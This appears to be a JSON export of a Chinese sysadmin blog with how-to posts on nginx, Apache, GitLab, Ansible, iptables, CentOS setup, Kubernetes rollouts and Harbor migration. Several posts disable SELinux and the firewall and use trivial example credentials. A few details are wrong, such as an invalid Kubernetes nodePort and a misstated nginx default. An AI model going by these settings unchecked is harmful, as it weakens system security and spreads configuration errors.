四核：worker_cpu_affinity 0001 0010 0100 1000; 进程1–\u003e 绑定第一个核心0001 进程2–\u003e 绑定第二个核心0010 进程3–\u003e 绑定第三个核心0100 进程4–\u003e 绑定第四个核心1000 八核：worker_cpu_affinity 00000001 00000010 00000100 00001000 00010000 00100000 01000000 10000000; 进程1–\u003e 绑定第一个核心00000001 进程2–\u003e 绑定第二个核心00000010 进程3–\u003e 绑定第三个核心00000100 进程4–\u003e 绑定第四个核心00001000 进程5–\u003e 绑定第五个核心00010000 进程6–\u003e 绑定第六个核心00100000 进程7–\u003e 绑定第七个核心01000000 进程8–\u003e 绑定第八个核心10000000 worker_processes最多开启8个，8个以上性能提升不会再提升了，而且稳定性变得更低，所以8个进程够用了。 三、Nginx最大打开文件数 worker_rlimit_nofile 65535; 这个指令是指当一个nginx进程打开的最多文件描述符数目，理论值应该是最多打开文件数（ulimit -n）与nginx进程数相除，但是nginx分配请求并不是那么均匀，所以最好与ulimit -n的值保持一致。 注：文件资源限制的配置可以在/etc/security/limits.conf设置，针对root/user等各个用户或者*代表所有用户来设置。 soft nofile 65535 hard nofile 65535 用户重新登录生效（ulimit -n） 四、Nginx事件处理模型 events { use epoll; worker_connections 65535; multi_accept on; } nginx采用epoll事件模型，处理效率高。 work_connections是单个worker进程允许客户端最大连接数，这个数值一般根据服务器性能和内存来制定。实际的值就是worker进程数乘以work_connections。 实际我们填入一个65535，足够了，这些都算并发值，一个网站的并发达到这么大的数量，也算一个大站了！ multi_accept 告诉nginx收到一个新连接通知后接受尽可能多的连接，默认是on，设置为on后，多个worker按串行方式来处理连接，也就是一个连接只有一个worker被唤醒，其他的处于休眠状态，设置为off后，多个worker按并行方式来处理连接，也就是一个连接会唤醒所有的worker，直到连接分配完毕，没有取得连接的继续休眠。当你的服务器连接数不多时，开启这个参数会让负载有一定的降低，但是当服务器的吞吐量很大时，为了效率，可以关闭这个参数。 五、开启高效传输模式 http { include mime.types; default_type application/octet-stream; …… sendfile on; tcp_nopush on; …… } Include mime.types ： 媒体类型,include 只是一个在当前文件中包含另一个文件内容的指令。 default_type application/octet-stream ：默认媒体类型足够。 sendfile on：开启高效文件传输模式，sendfile指令指定nginx是否调用sendfile函数来输出文件，对于普通应用设为 on，如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络I/O处理速度，降低系统的负载。注意：如果图片显示不正常把这个改成off。 tcp_nopush on：必须在sendfile开启模式才有效，防止网路阻塞，积极的减少网络报文段的数量（将响应头和正文的开始部分一起发送，而不一个接一个的发送。） ","date":"2019-09-05 13:03","objectID":"/post/816/:0:0","tags":["nginx"],"title":"nginx优化","uri":"/post/816/"},{"categories":["基础内容"],"content":"vim /etc/gitlab/gitlab.rb #52行左右 gitlab_rails['gitlab_email_enabled'] = true gitlab_rails['gitlab_email_from'] = '你的邮箱' gitlab_rails['gitlab_email_display_name'] = 'soulchild-gitlab' #517行左右 gitlab_rails['smtp_enable'] = true gitlab_rails['smtp_address'] = \"smtp.qq.com\" gitlab_rails['smtp_port'] = 465 gitlab_rails['smtp_user_name'] = \"你的邮箱\" gitlab_rails['smtp_password'] = \"授权码\" gitlab_rails['smtp_domain'] = \"qq.com\" gitlab_rails['smtp_authentication'] = \"login\" gitlab_rails['smtp_enable_starttls_auto'] = true gitlab_rails['smtp_tls'] = true #进入控制台（需要多等一会） gitlab-rails console irb(main):001:0\u003e Notify.test_email('xxxx@qq.com', 'Message Subject', 'Message Body').deliver_now","date":"2019-08-27 12:10","objectID":"/post/811/:0:0","tags":["gitlab"],"title":"gitlab发送邮件测试","uri":"/post/811/"},{"categories":["系统服务"],"content":"server { access_log logs/blog_access.log main; location / { root /var/www/blog; index index.php index.html index.htm; } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } location ~ \\.php$ { root /var/www/blog; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; } } ","date":"2019-08-26 15:50","objectID":"/post/807/:0:0","tags":["nginx"],"title":"nginx虚拟机主机配置","uri":"/post/807/"},{"categories":["系统服务"],"content":"httpd.conf文件 ServerRoot \"/usr/local/apache2\" 指定apache的安装目录 Listen 80 设置apache的监听端口 LoadModule access_module modules/mod_access.so LoadModule auth_module modules/mod_auth.so LoadModule jk_module modules/mod_jk.so 动态加载模块，在安装apache的时候指定了动态加载，因此就可以将需要的模块放到了modules目录下，然后在这里指定加载即可。 User daemon Group daemon 设定执行httpd的用户和组 ServerName www.example.com:80 用于绑定域名使用 \u003cDirectory /\u003e AllowOverride none Require all denied \u003c/Directory\u003e Directory一般用于对指定目录进行权限控制 AllowOverride 决定是否读取目录中的.htaccess文件 All：表示可以读取.htaccess文件的内容，修改原来的访问权限。 None：表示不读取.htaccess文件，权限由httpd.conf统一控制。 Require all denied：表示禁止所有请求访问资源，此配置表示禁止访问web服务器的任何目录 Require all granted：表示允许所有请求访问资源。Require是apache2.4版本的一个新特性 Require ip IP地址：允许某个IP访问 Require not ip IP地址：拒绝某个IP访问 Require host 主机名：允许某个主机访问 Require not host 主机名：拒绝某个主机访问 DocumentRoot \"/usr/local/apache2/htdocs\" 设置站点目录位置 \u003cDirectory \"/usr/local/apache2/htdocs\"\u003e Options Indexes FollowSymLinks AllowOverride None Require all granted \u003c/Directory\u003e Options 表示在这个目录内能够执行的操作，主要有4个可设定的值： Indexes：此参数表示如果在DocumentRoot指定目录下找不到索引文件时，就将此目录下所有文件列出来。 FollowSymLinks：表示在DocumentRoot指定目录下允许符号链接到其它目录。 ExecCGI：表示允许在DocumentRoot指定的目录下执行cgi操作。 ","date":"2019-08-26 11:19","objectID":"/post/800/:1:0","tags":["apache"],"title":"apache配置文件常用配置项说明","uri":"/post/800/"},{"categories":["系统服务"],"content":"httpd-default.conf Timeout 300 Timeout用来定义客户端和服务器端程序连接的超时间隔，单位为秒，超过这个时间间隔，服务器将断开与客户端的连接。 KeepAlive On KeepAlive用来定义是否允许用户建立永久连接，On为允许建立永久连接，Off表示拒绝用户建立永久连接，建议此选项设置为On MaxKeepAliveRequests 100 MaxKeepAliveRequests用来定义一个tcp连接可以进行HTTP请求的最大次数，设置为0代表不限制请求次数，这个选项与上面的KeepAlive相互关联，当KeepAlive设定为On，这个设置开始起作用。 KeepAliveTimeout 15 KeepAliveTimeout用来限定一次连接中最后一次请求完成后的等待时间，如果超过了这个等待时间，服务器就断开连接。 ServerTokens Prod ServerTokens可以用来禁止显示或发送Apache版本号，默认情况下，服务器HTTP响应头会包含apache和php版本号。 假定apache版本为Apache/2.4.29，PHP版本为PHP/7.1.14，那么ServerTokens可选的的赋值还有如下几个： ServerTokens Prod 会显示“Server: Apache” ServerTokens Major 会显示 “Server: Apache/2″ ServerTokens Minor 会显示“Server: Apache/2.4″ ServerTokens Min 会显示“Server: Apache/2.4.29″ ServerTokens OS 会显示 “Server: Apache/2.4.29 (Unix)” ServerTokens Full 会显示 “Server: Apache/2.4.29 (Unix) OpenSSL/1.0.1e-fips PHP/7.1.14″ ServerSignature Off 如果将此值设置为On的话，那么当打开某个不存在或者受限制的页面时，会在页面的右下角显示正在使用的apache的版本号，这也是非常危险的，因此建议设置为Off关闭版本信息显示。 HostnameLookups Off 表示以DNS来查询客户端地址，默认情况下是Off关闭状态，务必保持该设置，打开的话非常消耗系统资源。 ","date":"2019-08-26 11:19","objectID":"/post/800/:2:0","tags":["apache"],"title":"apache配置文件常用配置项说明","uri":"/post/800/"},{"categories":["devops"],"content":"清华镜像加速地址： https://mirrors.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json 进入插件管理—-\u003e高级 \u003cimg src=“images/1d15052062149346e2ff6557508eb648.png “1d15052062149346e2ff6557508eb648\"” /\u003e ","date":"2019-08-22 04:20","objectID":"/post/795/:0:0","tags":["jenkins"],"title":"jenkins加速","uri":"/post/795/"},{"categories":["基础内容"],"content":"备份： 修改默认存放备份站点目录，然后进行重新加载配置文件。 vim /etc/gitlab/gitlab.rb gitlab_rails['backup_path'] = \"/data/gitlab/backups\" #修改备份路径 gitlab_rails['backup_keep_time'] = 604800 #备份保留7天 [root@gitlab-ce ~]# gitlab-ctl reconfigure 2)手动执行备份命令，会将备份的结果存储 至/data/gitlab/backups目录中 gitlab-rake gitlab:backup:create 恢复gitlab数据： 停止数据写入服务 gitlab-ctl stop unicorn gitlab-ctl stop sidekiq 恢复数据(不需要备份的_gitlab_backup.tar) gitlab-rake gitlab:backup:restore BACKUP=1566444436_2019_08_21_12.0.3 启动服务 gitlab-ctl start unicorn gitlab-ctl start sidekiq","date":"2019-08-22 03:45","objectID":"/post/797/:0:0","tags":["gitlab"],"title":"gitlab备份恢复","uri":"/post/797/"},{"categories":["基础内容"],"content":"启动服务： -d：后台启动 -r：递归目录 /opt/svn-repo：项目总目录 svnserve -d -r /opt/svn-repo/ 创建项目： svnadmin create /opt/svn-repo/项目名称 拉取代码： svn checkout svn://ip/项目名称 设置项目登录权限 “write\"为可读可写，“read\"为只读，“none\"表示无访问权限。 1.在svn服务器的项目目录中，修改配置文件，开启登录验证 vim /opt/svn-repo/项目名称/conf/svnserve.conf [general] anon-access = none auth-access = write password-db = passwd authz-db = authz 2.添加用户 vim /opt/svn-repo/项目名称/conf/passwd [users] # harry = harryssecret # sally = sallyssecret user1 = 123 3.设置用户权限 [项目名称:路径] 用户名 = 权限 [项目名称:/] user1 = rw","date":"2019-08-15 21:25","objectID":"/post/791/:0:0","tags":["svn"],"title":"SVN常用知识","uri":"/post/791/"},{"categories":["基础内容","ansible"],"content":"文章转自：https://blog.51cto.com/liuzhengwei521/1962350 过滤出指定的信息： ansible all -m setup -a “filter=ansible_os_family” 信息说明： ansible_all_ipv4_addresses：仅显示ipv4的信息 ansible_devices：仅显示磁盘设备信息 ansible_distribution：显示是什么系统，例：centos,suse等 ansible_distribution_major_version：显示是系统主版本 ansible_distribution_version：仅显示系统版本 ansible_machine：显示系统类型，例：32位，还是64位 ansible_eth0：仅显示eth0的信息 ansible_hostname：仅显示主机名 ansible_kernel：仅显示内核版本 ansible_lvm：显示lvm相关信息 ansible_memtotal_mb：显示系统总内存 ansible_memfree_mb：显示可用系统内存 ansible_memory_mb：详细显示内存情况 ansible_swaptotal_mb：显示总的swap内存 ansible_swapfree_mb：显示swap内存的可用内存 ansible_mounts：显示系统磁盘挂载情况 ansible_processor：显示cpu个数(具体显示每个cpu的型号) ansible_processor_vcpus：显示cpu个数(只显示总的个数) ansible_python_version：显示python版本 ","date":"2019-08-15 11:52","objectID":"/post/788/:0:0","tags":["ansible"],"title":"ansible之setup模块常用的信息","uri":"/post/788/"},{"categories":["基础内容","ansible"],"content":"ansible模块使用官方文档：https://docs.ansible.com/ansible/latest/modules/list_of_all_modules.html # command模块常用选项(默认模块，此模块只能执行一些简单的命令，需要目标主机拥有python环境) creates：一个文件名，当该文件存在，则该命令不执行，反正，则执行。 chdir：在执行指令之前，先切换到该指定的目录 removes：一个文件名，当该文件存在时，则该选项执行，反之，不执行。 举例： [root@m01 ~]# ansible all -m command -a \"hostname\" 因为command是默认模块，所以也可以写成： [root@m01 ~]# ansible all -a \"hostname\" #sshd.pid文件不存在执行service start sshd,存在就不执行 [root@m01 ~]# ansible all -a 'creates=/run/sshd.pid service start sshd' #切换目录，然后在执行pwd [root@m01 ~]# ansible all -m command -a \"chdir=/opt pwd\" # shell模块(使用方法同command模块,需要目标主机拥有python环境) [root@m01 ~]# ansible all -m shell -a \"hostname \u003e\u003e /tmp/hostname.txt\" # raw模块（使用方法同command模块,目标主机无需拥有python环境） 没有creates，chdir，removes这三个选项 # script模块(远程执行脚本) #直接写本地脚本路径即可 [root@m01 scripts]# ansible all -m script -a \"./yum.sh\" # file模块(设置文件符号链接和目录的属性，或删除文件/符号链接/目录) force：需要在两种情况下强制创建软链接，一种是源文件不存在但之后会建立的情况下；另一种是目标软链接已存在,需要先取消之前的软链，然后创建新的软链，有两个选项：yes|no group：定义文件/目录的属组 mode：定义文件/目录的权限 owner：定义文件/目录的属主 path：必选项，定义文件/目录的路径 recurse：递归的设置文件的属性，只对目录有效 yes | no src：要被链接的源文件的路径，只应用于state=link的情况 dest：被链接到的目标路径，只应用于state=link的情况 state： 有如下几个选项： directory：表示目录，如果目录不存在，则创建目录。 link：创建软链接 hard：创建硬链接 touch：如果文件不存在，则会创建一个新的文件，如果文件或目录已存在，则更新其最后修改时间 absent：删除目录、文件或者取消链接文件。 # 创建目录 [root@m01 scripts]# ansible all -m file -a \"path=/root/soulchild state=directory\" #在root目录下创建soulchild目录，设置所有者和组为nobody，权限为644，递归设置权限 [root@m01 scripts]# ansible all -m file -a 'path=/root/soulchild owner=nobody group=nobody mode=644 recurse=yes' # 创建软连接 [root@m01 scripts]# ansible all -m file -a \"src=/etc/hosts dest=/root/hosts state=link\" # copy模块(将文件从本地复制到远程主机) copy模块包含如下选项： backup：在覆盖之前将原文件备份，备份文件包含时间信息。有两个选项：yes|no content：用于替代”src”参数,可以直接设定指定文件的值 dest：必选项。要将源文件复制到的远程主机的绝对路径，如果源文件是一个目录，那么该路径也必须是个目录 directory_mode：递归的设定目录的权限，默认为系统默认权限 force：如果目标主机包含该文件，但内容不同，如果设置为yes，则强制覆盖，如果为no，则只有当目标主机的目标位置不存在该文件时，才复制。默认为yes src：要复制到远程主机的文件在本地的地址，可以是绝对路径，也可以是相对路径。如果路径是一个目录，它将递归复制。在这种情况下，如果路径使用”/”来结尾，则只复制目录里的内容，如果没有使用”/”来结尾，则包含目录在内的整个内容全部复制，类似于rsync。 validate：复制到目标位置之前先运行的验证命令。要验证的文件的路径通过“%s”传入。使用：validate=‘visudo -cf %s’ 其他参数：所有的file模块里的选项都可以在这里使用 #将本地的show.sh发送到所有主机的/root目录下 [root@m01 ~]# ansible all -m copy -a \"src=/server/scripts/show.sh dest=/root\" #将本地的show.sh发送到所有主机的/root目录下，并设置所有者和权限 [root@m01 ~]# ansible all -m copy -a \"src=/server/scripts/show.sh dest=/root owner=nobody group=nobody mode=755\" # yum模块(安装删除软件包) name:软件包的名称 state: absent:删除软件 installed:安装 latest:更新 present:安装，同installed(默认) removed:删除软件   批量删除软件 [root@m01 scripts]# ansible all -m yum -a “name=cowsay state=removed” 批量安装软件 [root@m01 scripts]# ansible all -m yum -a “name=cowsay state=installed” # cron模块(添加定时任务) minute:0-59 hour:0-23 day:1-31 month:1-12 weekday:0-6===\u003e周日-周六 可以用*， /2这种形式，不写为 name:描述，添加任务需要填写(删除时按照次名称删除) job:要执行的命令 state: absent:删除 present:添加(默认) user:指定指定用户，默认为root 每天00:00开始备份etc目录 [root@m01 scripts]# ansible all -m cron -a ’name=“backup etc” minute=00 hour=00 job=“tar zcf /tmp/etc-date +%Y%m%d-%H%M.tar.gz /etc \u003e /dev/null 2\u003e\u00261” state=present' 删除指定任务 [root@m01 scripts]# ansible all -m cron -a “name=‘backup etc’ state=absent” 每个模块官方都有更详细的例子和使用参数，这里只写一些简单的举例 ","date":"2019-08-12 17:30","objectID":"/post/239/:0:0","tags":["ansible"],"title":"ansible常用模块的简单使用","uri":"/post/239/"},{"categories":["ansible"],"content":"ansible命令的常用选项： -m MODULE_NAME：指定要执行的模块的名称，如果不指定-m选项，默认是COMMAND模块。 -a MODULE_ARGS,：指定执行模块对应的参数选项。 -k：提示输入SSH登录的密码而不是基于密钥的验证 -K：用于输入执行su或sudo操作时需要的认证密码。 -b：表示提升权限操作。 –become-method：指定提升权限的方法，常用的有 sudo和su，默认是sudo。 –become-user：指定执行 sudo或su命令时要切换到哪个用户下，默认是root用户。 -B ：指定一个时间，命令运行时间超过时就结束此命令 -C：测试一下会改变什么内容，不会真正去执行，主要用来测试一些可能发生的变化 -f FORKS,：设置ansible并行的任务数。默认值是5 -i INVENTORY： 指定主机清单文件的路径，默认为/etc/ansible/hosts。 Ad-hoc执行： ansible 主机或组 -m 模块名 -a ‘模块参数’ ansible参数 主机和组：是在/etc/ansible/hosts 里进行指定的部分。也可以使用脚本从外部应用里获取的主机。动态Inventory(清单) 模块名：可以通过ansible-doc -l 查看目前安装的模块，默认不指定时，使用的是command模块，具体可以查看/etc/ansible/ansible.cfg 的“#module_name = command ” 部分，默认模块可以在该配置文件中进行修改； 模块参数：可以通过 “ansible-doc 模块名” 查看具体的用法及后面的参数； ansible参数：可以通过ansible命令的帮忙信息里查看到，这里有很多参数可以供选择，如是否需要输入密码、是否sudo等。 ","date":"2019-08-12 15:14","objectID":"/post/776/:0:0","tags":["ansible"],"title":"ansible命令常用参数和Ad-hoc的使用格式","uri":"/post/776/"},{"categories":["基础内容","ansible"],"content":"/etc/ansible/ansible.cfg #inventory= /etc/ansible/hosts 该参数表示资源清单inventory文件的位置，资源清单就是一些Ansible需要连接管理的主机列表 #library= /usr/share/my_modules/ Ansible的操作动作，无论是本地或远程，都使用一小段代码来执行，这小段代码称为模块，这个library参数就是指向存放Ansible模块的目录 #remote_tmp= ~/.ansible/tmp 指定远程执行的路径 #local_tmp= ~/.ansible/tmp ansible管理节点的执行路径 #forks= 5 forks 设置默认情况下Ansible最多能有多少个进程同时工作，默认设置最多5个进程并行处理。具体需要设置多少个，可以根据控制主机的性能和被管理节点的数量来确定。 #poll_interval= 15 轮询间隔 #sudo_user= root sudo使用的默认用户 ，默认是root #ask_sudo_pass = True 是否需要用户输入sudo密码 #ask_pass= True 是否需要用户输入连接密码 #remote_port= 22 这是指定连接对端节点的管理端口，默认是22，除非设置了特殊的SSH端口，不然这个参数一般是不需要修改的 #module_lang= C 这是默认模块和系统之间通信的计算机语言,默认为’C’语言. host_key_checking= False 跳过ssh首次连接提示验证部分，False表示跳过。 #timeout= 10 连接超时时间 #module_name= command 指定ansible默认的执行模块 #nocolor= 1 默认ansible会为输出结果加上颜色,用来更好的区分状态信息和失败信息.如果你想关闭这一功能,可以把’nocolor’设置为‘1’: #private_key_file=/path/to/file.pem 在使用ssh公钥私钥登录系统时候，使用的密钥路径。 ","date":"2019-08-12 15:08","objectID":"/post/772/:0:0","tags":["ansible"],"title":"ansible配置文件参数参考","uri":"/post/772/"},{"categories":["基础内容"],"content":"参数说明： -t table 用来指明使用的表，有三种选项: filter，nat，mangle。若未指定，则默认使用filter表。 command 指定iptables 对我们提交的规则要做什么样的操作。命令都需要以chain作为参数。 -P (--policy) 定义默认策略。 -L (--list) 查看规则列表。 -A (--append) 在规则列表的最后增加规则。 -I (--insert) 在指定的位置插入规则。 -D (--delete) 从规则列表中删除规则。 -R (--replace) 替换规则列表中的某条规则。 -F (--flush) 清楚指定的规则。 -Z (--zero) 将指定链（如未指定，则认为是所有链）的所有计数器归零。 -X (--delete-chain) 删除指定用户自定义链。   修改链的状态： iptables -P INPUT DROP 开放指定端口: iptables -A INPUT -s 0/0 -p tcp -m tcp –dport 22 -j ACCEPT 删除规则： iptables -D INPUT -s 0/0 -p tcp -m tcp –dport 22 -j ACCEPT 信任来源IP： iptables -A INPUT -s 10.0.0.0/24 -j ACCEPT 开放回环地址访问： iptables -A INPUT -i lo -j ACCEPT ","date":"2019-08-10 21:51","objectID":"/post/767/:0:0","tags":["iptables"],"title":"iptables的filter表常用操作","uri":"/post/767/"},{"categories":["基础内容"],"content":"1.修改ssh /etc/ssh/sshd_config UseDNS no GSSAPIAuthentication no 2.关闭selinux,NetworkManager. 设置iptables systemctl stop NetworkManager systemctl disable NetworkManager sed -i ’s#SELINUX=enforcing#SELINUX=disabled#’ /etc/selinux/config 3.配置yum源 centos7： curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo curl -o /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo centos6： curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo curl -o /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-6.repo 4.安装常用软件 yum install -y vim tree wget bash-completion wget lsof nmap nc lrzsz telnet bind-utils psmisc net-tools ntpdate 5.时间同步 ntpdate ntp1.aliyun.com \u0026\u003e/dev/null ","date":"2019-08-09 19:58","objectID":"/post/759/:0:0","tags":[],"title":"centos系统基础优化","uri":"/post/759/"},{"categories":["基础内容","常用命令"],"content":"centos6： yum install -y httpd httpd-devel mysql-devel mysql-server mysql php php-mysql gd php-gd gd-devel php-xml php-common php-mbstring php-ldap php-pear php-xmlrpc php-imap service httpd start service mysqld start mysqladmin -u root password xxxxx centos7： yum install -y httpd httpd-devel php php-mysql gd php-gd gd-devel php-xml php-common php-mbstring php-ldap php-pear php-xmlrpc php-imap mariadb mariadb-devel mariadb-server systemctl enable httpd systemctl start httpd systemctl enable mariadb systemctl start mariadb mysqladmin -u root password xxxxx 安装php7 rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm yum -y install php71w php71w-cli php71w-common php71w-devel php71w-embedded php71w-gd php71w-mcrypt php71w-mbstring php71w-pdo php71w-xml php71w-fpm php71w-mysqlnd php71w-opcache php71w-pecl-memcached php71w-pecl-redis php71w-pecl-mongodb ","date":"2019-08-02 21:22","objectID":"/post/737/:0:0","tags":["lamp"],"title":"centos-yum快速部署lamp相关","uri":"/post/737/"},{"categories":["基础内容"],"content":"一、安装gitlab 1.安装gitlab依赖 yum install -y curl policycoreutils-python openssh-server 2.下载gitlab，rpm包 自选版本：https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el7/ #下载12.0.3版本(汉化包也是12.0.3，两个要一样) wget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el7/gitlab-ce-12.0.3-ce.0.el7.x86_64.rpm #安装gitlab rpm -ivh gitlab-ce-12.0.3-ce.0.el7.x86_64.rpm 3.修改配置文件 vim /etc/gitlab/gitlab.rb external_url修改为你的ip或域名 4.配置邮箱 vim /etc/gitlab/gitlab.rb #52行左右 gitlab_rails['gitlab_email_enabled'] = true gitlab_rails['gitlab_email_from'] = '742899387@qq.com' gitlab_rails['gitlab_email_display_name'] = 'soulchild-gitlab' #517行左右 gitlab_rails['smtp_enable'] = true gitlab_rails['smtp_address'] = \"smtp.qq.com\" gitlab_rails['smtp_port'] = 465 gitlab_rails['smtp_user_name'] = \"你的邮箱\" gitlab_rails['smtp_password'] = \"授权码\" gitlab_rails['smtp_domain'] = \"qq.com\" gitlab_rails['smtp_authentication'] = \"login\" gitlab_rails['smtp_enable_starttls_auto'] = true gitlab_rails['smtp_tls'] = true 5.重新生成配置文件并启动服务 gitlab-ctl reconfigure gitlab-ctl status 6.打开地址就可以访问了 二、汉化（两种方式） 覆盖文件方式： 1.下载解压汉化包（12-0-stable-zh的部分可以改成你的版本号） 下载地址：https://gitlab.com/xhang/gitlab/tree/12-0-stable-zh tar xf gitlab-12-0-stable-zh.tar.gz 2.覆盖文件进行汉化(*汉化包和你的gitlab版本一定要一样) #备份原文件 cp -rp /opt/gitlab/embedded/service/gitlab-rails{,.bak_$(date +%F)} #将汉化包覆盖过去(\\也需要敲) \\cp -rf ./* /opt/gitlab/embedded/service/gitlab-rails gitlab-ctl reconfigure gitlab-ctl start 3.启动相关组件服务 gitlab-ctl start #汉化后可能会出现502，需要多等一会就行了 4.汉化后到gitlab偏好设置中设置为简体中文就完美了。 打补丁的方式： 1.clone补丁文件 git clone https://gitlab.com/xhang/gitlab.git 2.生成补丁文件 cd gitlab #查看gitlab版本号 gitlab_version=$(sudo cat /opt/gitlab/embedded/service/gitlab-rails/VERSION) \u0026\u0026 echo $gitlab_version #查看汉化包版本号（*一定要保证和gitlab的版本号一致） cat VERSION #导出 patch 用的 diff 文件 git diff v${gitlab_version} v${gitlab_version}-zh \u003e ../${gitlab_version}-zh.diff 3.导入汉化补丁 gitlab-ctl stop cd ../ #可能会提示让你输入文件路径，一路回车就行了。 patch -d /opt/gitlab/embedded/service/gitlab-rails -p1 \u003c ${gitlab_version}-zh.diff 4.重新加载配置，启动服务 gitlab-ctl reconfigure gitlab-ctl restart \u003cimg src=“images/143ed035cf4cfe48c1642a93a792126c.png “143ed035cf4cfe48c1642a93a792126c”” /\u003e ","date":"2019-08-01 20:43","objectID":"/post/729/:0:0","tags":["gitlab"],"title":"gitlab安装和汉化的两种方式","uri":"/post/729/"},{"categories":["kubernetes"],"content":"1.创建资源（–record可以记录历史版本，方便回滚） kubectl create -f nginx-deploy.yaml --record nginx-deploy.yaml： apiVersion: extensions/v1beta1 kind: Deployment metadata: name: nginx-deployment spec: replicas: 3 template: metadata: labels: app: nginx spec: containers: - name: nginx image: registry:5000/nginx:1.13 ports: - containerPort: 80 resources: limits: cpu: 100m requests: cpu: 100m 2.创建svc资源(提供网络访问、暴露端口) apiVersion: v1 kind: Service metadata: name: nginx-deployment spec: type: NodePort ports: - port: 80 nodePort: 3002 targetPort: 80 selector: app: nginx 镜像版本升级和回滚 升级镜像： #参数说明 deployment :资源类型 nginx-deployment ：资源名称 nginx=registry:5000/nginx:1.15：给指定的容器修改镜像。通过kubectl get rs -o wide查看CONTAINER(S)中容器的名称 kubectl set image deployment nginx-deployment nginx=registry:5000/nginx:1.15 查看历史版本： #参数说明 deployment ：资源类型 nginx-deployment ：资源名称 kubectl rollout history deployment nginx-deployment 回滚到上一个版本： #参数说明 deployment ：资源类型 nginx-deployment ：资源名称 kubectl rollout undo deployment nginx-deployment 回滚到指定版本： #参数说明 deployment ：资源类型 nginx-deployment ：资源名称 --to-revision=2 ：回滚到指定版本，通过history可以查看 kubectl rollout undo deployment nginx-deployment --to-revision=2","date":"2019-07-26 22:35","objectID":"/post/724/:0:0","tags":["k8s"],"title":"k8s-deployment资源创建、升级、回滚","uri":"/post/724/"},{"categories":["kubernetes"],"content":"镜像需要提前准备好，registry:5000是本地私有仓库地址 1.创建一个rc资源 kubectl create -f nginx-rc.yaml nginx-rc.yaml： apiVersion: v1 kind: ReplicationController metadata: name: nginx spec: replicas: 5 selector: app: myweb template: metadata: labels: app: myweb spec: containers: - name: myweb image: registry:5000/nginx:1.13 ports: - containerPort: 80 2.创建svc资源(提供网络访问、暴露端口) kubectl create -f nginx-svc.yaml nginx-svc.yaml： apiVersion: v1 kind: Service metadata: name: myweb spec: type: NodePort ports: - port: 80 nodePort: 30001 targetPort: 80 selector: app: myweb 3.查看pod状态，都为running kubectl get all -o wide 打开测试访问： http://10.0.0.13:3001 将nginx1.13升级到nginx1.15 镜像升级 1.指定镜像升级,每10秒升级一个 kubectl rolling-update nginx --image=registry:5000/nginx:1.15 --update-period=10s yaml文件升级和回滚 2.基于yaml文件升级 kubectl rolling-update nginx -f nginx-rc1.15.yaml --update-period=10s #修改svc的标签选择器为myweb2 kubectl edit svc myweb selector: app: myweb2 nginx-rc1.15.yaml： apiVersion: v1 kind: ReplicationController metadata: name: nginx2 spec: replicas: 5 selector: app: myweb2 template: metadata: labels: app: myweb2 spec: containers: - name: myweb2 image: registry:5000/nginx:1.15 ports: - containerPort: 80 回滚： kubectl rolling-update nginx2 -f nginx-rc.yaml --update-period=1s #修改svc的标签选择器为myweb kubectl edit svc myweb selector: app: myweb ","date":"2019-07-22 23:18","objectID":"/post/711/:0:0","tags":["k8s"],"title":"k8s-rc资源创建、滚动升级","uri":"/post/711/"},{"categories":["kubernetes"],"content":"安装前准备： 环境： 主机 服务 ip k8s-master etcd、 10.0.0.11 k8s-node-1 k8s-node 10.0.0.12 k8s-node-2 k8s-node 10.0.0.13 所有主机配置hosts解析 10.0.0.11 k8s-master 10.0.0.12 k8s-node-1 10.0.0.13 k8s-node-2 关闭防火墙和selinux systemctl stop firewalld setenforce 0 yum源使用的是阿里云的 curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo kubernetes架构图： ","date":"2019-07-20 17:56","objectID":"/post/681/:0:0","tags":["k8s"],"title":"yum方式安装部署k8s集群","uri":"/post/681/"},{"categories":["虚拟化","docker"],"content":"环境： 10.0.0.11 harbor 10.0.0.12 registry 实现思路： 获取registry仓库镜像–\u003e获取registry仓库镜像的标签–\u003e每个镜像打好harbor仓库标签–\u003e上传至harbor仓库 1.准备工具jq yum install -y jq 2.harbor中创建一个项目registry 我的操作都是在10.0.0.12上操作的，所以在执行脚本前需要做一些其他工作： #登录harbor仓库，上传镜像需要 docker login soulchild.cn #soulchild.cn需要单独做一下解析，harbor仓库地址为10.0.0.11 echo \"10.0.0.11 soulchild.cn\" \u003e\u003e /etc/hosts 3.编写脚本(在registry中执行，这样可以省去pull镜像的步骤，直接上传到harbor即可) #!/bin/bash images=`curl -s -u test:test 10.0.0.12:5000/v2/_catalog | jq .repositories[] | tr -d '\"'` for image in $images; do tags=`curl -s -u test:test 10.0.0.12:5000/v2/$image/tags/list | jq .tags[] | tr -d '\"'` for tag in $tags; do docker tag 10.0.0.12:5000/$image:$tag soulchild.cn/registry/$image:$tag docker push soulchild.cn/registry/$image:$tag if [ $? -eq 0 ];then echo \"###############################$image:$tag pull complete!###############################\" else echo \"$image:$tag pull failure!\" fi done done 脚本执行完后可以发现harbor仓库中镜像已经传输完成了。 \u003cimg src=“images/de6b5916d56bb5088582ea20e8e6a8ca.png “de6b5916d56bb5088582ea20e8e6a8ca”” /\u003e ","date":"2019-07-19 00:17","objectID":"/post/691/:0:0","tags":["docker"],"title":"将registry仓库镜像迁移至harbor中","uri":"/post/691/"},{"categories":["虚拟化","docker"],"content":"自签名证书： https://www.cnblogs.com/Rcsec/p/8479728.html 进入到harbor目录操作： 1.编辑harbor.yml修改以下部分,https部分需要取消注释 hostname: soulchild.cn # https related config https: # # https port for harbor, default is 443 port: 443 # # The path of cert and key files for nginx certificate: /data/cert/myharbor.cert private_key: /data/cert/myharbor.key 2.添加hosts解析 echo “10.0.0.11 soulchild.cn” \u003e\u003e /etc/hosts 3.配置证书文件 